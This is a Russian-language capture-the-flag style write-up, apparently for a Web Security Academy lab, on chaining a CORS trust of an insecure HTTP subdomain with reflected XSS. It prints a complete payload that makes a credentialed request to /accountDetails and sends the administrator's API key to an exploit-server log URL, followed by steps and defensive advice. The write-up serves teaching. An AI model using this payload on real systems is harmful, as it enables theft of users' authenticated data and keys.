<a id="goal"></a>

## 🎯 Цель

Эксплуатировать неправильно настроенную политику CORS, которая доверяет доверенному поддомену через обычный протокол HTTP, чтобы:

```text
1. Определить доверенный поддомен, который работает через обычный HTTP.
2. Найти уязвимость Cross-Site Scripting (XSS) на этом небезопасном поддомене.
3. Создать JavaScript-пейлоад, который использует CORS для выполнения аутентифицированного запроса к основному приложению HTTPS (`/accountDetails`).
4. Заставить браузер администратора (жертву) выполнить этот пейлоад.
5. Эксфильтровать API-ключ администратора на сервер эксплойтов.
```

<a id="theory"></a>

## 🧠 Краткая теория
Стандартная SOP не позволяет скриптам из одного источника получать доступ к данным в другом. CORS может ослабить это ограничение, но безопасность зависит от доверия. Серьёзный недостаток возникает, когда защищённое приложение (HTTPS) доверяет поддомену, использующему небезопасный HTTP. Злоумышленник, выполняющий атаку "Man-in-the-Middle" (MitM), может внедрить вредоносный скрипт в незашифрованный HTTP-трафик. Современные браузеры будут считать этот скрипт работающим из доверенного источника.

Эта лаба симулирует этот сценарий. Хотя мы не выполняем MitM-атаку, нам дан доверенный HTTP-поддомен с уязвимостью XSS, что позволяет достичь той же цели: запустить произвольный JavaScript из доверенного источника.

<a id="idea"></a>

## 🧩 Ключевая идея
Защищённое основное приложение (`https://YOUR-LAB-ID.web-security-academy.net`) динамически заносит в белый список и доверяет любому из своих поддоменов, независимо от протокола (HTTPS или HTTP). Поддомен `stock` (`http://stock.YOUR-LAB-ID...`) использует HTTP и уязвим для отражённой XSS. Мы используем этот XSS как плацдарм.

```text
Защищённое приложение: Доверяет http://stock... и разрешает учетные данные.
Небезопасный поддомен: Уязвим для XSS.
Браузер жертвы:      Переходит по URL-адресу XSS на поддомене HTTP.
Скрипт XSS:          Выполняет аутентифицированный AJAX-запрос к основному приложению HTTPS, используя куки.
Защищённое приложение: Видит Origin: http://stock..., находит его в ошибочном белом списке и отражает ACAO с учетными данными.
Скрипт XSS:          Читает ответ и эксфильтрует API-ключ ✅
```

<a id="headers"></a>

## 📡 Уязвимые заголовки
Тестирование эндпоинта `/accountDetails` с поддельным заголовком `Origin` в Burp Repeater подтверждает уязвимость:

```http
Origin: http://subdomain.0a8000af04b2aaa8801e0d1800f600dd.web-security-academy.net
```
Сервер отвечает:
```http
Access-Control-Allow-Origin: http://subdomain.0a8000af04b2aaa8801e0d1800f600dd.web-security-academy.net
Access-Control-Allow-Credentials: true
```
Это подтверждает, что защищённое приложение (HTTPS) явно разрешает кросс-доменные запросы от небезопасного поддомена (HTTP) и при этом принимает сессионные куки.

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта
Мы создаём HTML-обёртку, которая заставляет жертву перейти по XSS-URL на HTTP-поддомене. Этот URL, в свою очередь, содержит JavaScript-"матрёшку" для кражи данных.

```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>
        var req = new XMLHttpRequest();
        req.onload = function() {
            location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bencodeURIComponent(this.responseText);
        };
        req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
        req.withCredentials = true; // (!) КРИТИЧЕСКИ ВАЖНО: Прикрепить куки
        req.send();
    %3c/script>&storeId=1"
</script>
```
*Обратите внимание на URL-кодирование для закрывающего тега `<script>` (`%3c`) и эксфильтрации данных (`%2b` для `+`).*

<a id="step1"></a>

## 🔍 Шаг 1 — Поиск целевого эндпоинта
Авторизуйтесь как тестовый пользователь. Перейдите на страницу аккаунта. Найдите AJAX-запрос к `GET /accountDetails`. Этот запрос возвращает API-ключ. Подтвердите, что ответ содержит `Access-Control-Allow-Credentials: true`.

<a id="step2"></a>

## 🔍 Шаг 2 — Тестирование отражения HTTP Origin
Отправьте запрос `/accountDetails` в Burp Repeater. Добавьте заголовок `Origin`, используя `http` и произвольный поддомен: `Origin: http://subdomain.YOUR-LAB-ID...`. Убедитесь, что источник динамически отражается в `Access-Control-Allow-Origin`, подтверждая ошибочное отношение доверия.

<a id="step3"></a>

## 🔍 Шаг 3 — Поиск XSS на HTTP-поддомене
Перейдите на страницу товара и нажмите "Check stock". Просмотрите Burp History, чтобы найти запрос к поддомену `stock` (`Host: stock.YOUR-LAB-ID...`) через HTTP. Это должен быть GET-запрос вида `GET /?productId=1&storeId=1`.
Протестируйте параметр `productId` на наличие отражённой XSS: `GET /?productId=<test>&storeId=1`. Убедитесь, что `<test>` отражается в ответе 400.

<a id="step4"></a>

## 🔍 Шаг 4 — Создание и доставка эксплойта
Откройте Exploit Server. Оберните стандартный XHR-пейлоад в редирект `document.location` внутри тега `<script>`. Внедрите финальный XSS-пейлоад в параметр `productId`, обеспечив правильное кодирование. Сохраните эксплойт и доставьте его жертве.

Проверьте Access Log на сервере эксплойтов. Найдите запрос от IP-адреса жертвы, содержащий украденные данные: `GET /log?key=%7B%0A%20%20%22username%22...`. Извлеките API-ключ администратора.

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки
```text
1. Определение эндпоинта (/accountDetails) и подтверждение ACAC: true.
2. Верификация динамического CORS отражения для небезопасного http://поддомена.
3. Определение XSS уязвимости на небезопасном HTTP-поддомене (stock).
4. Создание HTML-пейлоада для редиректа на XSS-URL.
5. Внедрение JavaScript-"матрёшки" CORS внутрь XSS-пейлоада.
6. Жертва получает HTML, который перенаправляет её на XSS через http.
7. Браузер жертвы выполняет скрипт, отправляя аутентифицированный XHR на https.
8. Защищённое приложение отражает ACAO, и браузер позволяет скрипту прочитать ответ.
9. Скрипт эксфильтрует украденный API-ключ в лог сервера эксплойтов.
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала
1. Доверие к HTTP-поддоменам
Защищённое приложение (`https://...`) нарушило границу доверия HTTPS, явно доверяя небезопасному источнику (`http://stock...`). Это создало значительную уязвимость безопасности.

2. Связывание CORS с XSS
Злоумышленник связал две уязвимости: ошибочную политику CORS и отражённую XSS. XSS на небезопасном доверенном источнике была использована как идеальный плацдарм для аутентифицированного кросс-доменного запроса к защищённому источнику.

<a id="pentester"></a>
## 🧠 Как думать как пентестер
При оценке конфигураций CORS никогда не предполагайте, что HTTPS создаёт полную защищённую границу.

```text
Если защищённое приложение (HTTPS) доверяет небезопасному источнику (HTTP, особенно если это поддомен, контролируемый пользователем, или третья сторона), это отношение доверия в корне ошибочно.
Если вы найдёте XSS на небезопасном доверенном источнике, вы можете обойти всю SOP-защиту для защищённого источника, используя CORS.
Всегда тестируйте динамическое отражение для `http` vs. `https`.
```

<a id="mistakes"></a>

## ❌ Типичные ошибки
Ошибка 1. Забытый флаг `req.withCredentials = true`
Без этого флага AJAX-запрос не будет включать сессионные куки жертвы, и сервер вернёт общедоступное сообщение об ошибке вместо данных администратора.

Ошибка 2. Неправильное URL-кодирование
Этот пейлоад — "матрёшка". Он требует URL-кодирования на разных уровнях: закрывающего тега `<script>` (`%3c`) и конкатенации для эксфильтрации данных (`%2b`). Неправильное кодирование ломает JavaScript.

<a id="defense"></a>

## 🛡 Защита
1. Не доверяйте HTTP
Никогда не вносите небезопасные источники (HTTP) в белый список CORS защищённого приложения (HTTPS).

2. Принудительное использование HTTPS
Обеспечьте, чтобы все поддомены и доверенные партнеры использовали современный, строгий HTTPS с HSTS для предотвращения MitM-атак.

3. Санитизация
Правильно санитизируйте все вводимые пользователем данные (например, `productId`), чтобы предотвратить уязвимости XSS, которые часто используются как плацдармы для других атак.

## 🧾 Итог
Лаборатория успешно продемонстрировала, как граница HTTPS защищённого приложения может быть фатально нарушена из-за неправильной конфигурации CORS, доверяющей небезопасным протоколам. Используя уязвимость XSS на небезопасном доверенном поддомене, злоумышленник может украсть конфиденциальные аутентифицированные данные из основного приложения, фактически сводя на нет его защиту HTTPS.
